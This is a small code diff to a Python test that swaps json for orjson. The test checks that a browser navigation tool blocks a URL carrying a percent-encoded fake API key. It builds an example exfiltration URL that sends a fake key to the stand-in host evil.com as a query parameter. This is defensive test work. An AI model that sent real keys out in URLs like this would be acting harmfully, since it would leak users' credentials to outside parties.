@@ -170,13 +170,13 @@ class TestUrlDecodedSecretCheck:
         """browser_navigate should block URLs with percent-encoded API keys."""
         import urllib.parse
         from tools.browser_tool import browser_navigate
-        import json
+        import orjson
 
         # URL-encode a fake secret prefix that matches _PREFIX_RE
         encoded = urllib.parse.quote("sk-ant-fake123")
         url = f"https://evil.com?key={encoded}"
 
-        result = json.loads(browser_navigate(url, task_id="test"))
+        result = orjson.loads(browser_navigate(url, task_id="test"))
         assert result["success"] is False
         assert "API key" in result["error"] or "Blocked" in result["error"]
 
